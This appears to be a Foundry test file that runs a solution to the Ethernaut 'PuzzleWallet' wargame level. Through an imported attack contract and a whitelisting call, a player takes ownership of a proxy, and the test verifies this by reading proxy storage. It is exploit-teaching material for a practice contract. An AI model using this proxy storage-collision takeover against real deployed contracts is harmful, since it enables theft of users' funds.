// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet, PuzzleAttack} from "../../src/ethernaut/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleProxy proxy;
    PuzzleWallet wallet;
    PuzzleAttack attack;
    address player = makeAddr("player");

    function setUp() public {
        proxy = new PuzzleProxy(address(this));
        wallet = new PuzzleWallet();
        // Point the proxy at the wallet and fund it.
        proxy.approveNewAdmin(address(wallet));
        address payable proxyAddr = payable(address(proxy));
        (bool ok,) = proxyAddr.call{value: 0.001 ether}(abi.encodeWithSignature("deposit()"));
        require(ok, "deposit failed");
        attack = new PuzzleAttack();
    }

    receive() external payable {}

    function testPuzzleWalletExploit() public {
        // Step 1: from the attack contract, make player the proxy owner.
        attack.attack(proxy, player);
        // Step 2: player (now owner) whitelists themselves through the proxy.
        vm.prank(player);
        (bool ok,) = address(proxy).call(abi.encodeWithSignature("whitelist(address)", player));
        require(ok, "whitelist failed");

        emit log_named_address("proxy owner", proxy.owner());
        // Read the whitelisted mapping from the proxy's storage (slot 2)
        // directly; owner is an EOA so delegatecalls would revert.
        uint256 slot = uint256(keccak256(abi.encode(player, uint256(2))));
        bool whitelistedViaProxy = vm.load(address(proxy), bytes32(slot)) != 0;
        assertEq(proxy.owner(), player);
        assertTrue(whitelistedViaProxy);
    }
}

contract PuzzleWalletControlTest is Test {
    function testStartsLocked() public {
        PuzzleProxy proxy = new PuzzleProxy(address(this));
        assertEq(proxy.owner(), address(this));
        assertEq(proxy.maxBalance(), 0);
    }
}

// end

